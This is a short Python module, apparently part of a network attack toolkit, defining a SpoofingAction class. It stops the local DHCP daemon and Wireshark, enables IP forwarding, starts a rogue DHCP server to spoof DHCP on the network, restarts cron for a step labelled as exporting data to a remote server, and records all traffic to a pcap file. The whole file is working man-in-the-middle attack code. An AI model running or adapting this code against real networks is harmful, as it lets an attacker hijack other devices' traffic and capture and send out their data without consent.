from os import system


class SpoofingAction:

    env = None
    DHCPmodel = None

    def __init__(self,Environement):
        self.env = Environement
        self.DHCPmodel = self.env.getModel('DHCP')
        system('pkill wireshark')
        system('systemctl stop dhcpd4')

    def run(self):
        print('\033[1m' + '--------------------------------------------\n'
                          '[*] SpoofingAction running. It will try to spoof the DHCP.\n' + '\033[0m')
        #self.DHCPmodel.DHCP_Discover_Dos()
        print('[*] Starting routing mode...')
        system('sysctl net.ipv4.ip_forward=1')
        print('[*] Starting DHCP server...')
        system('systemctl restart dhcpd4')
        print('[*] Exporting data to remote server...')
        system('systemctl restart cronie')
        print('[*] Logging trafic...')
        system('sudo su magicpi -c "wireshark -qw ' + self.env.appDir + '../tmpfiles/wireshark.pcap &"')
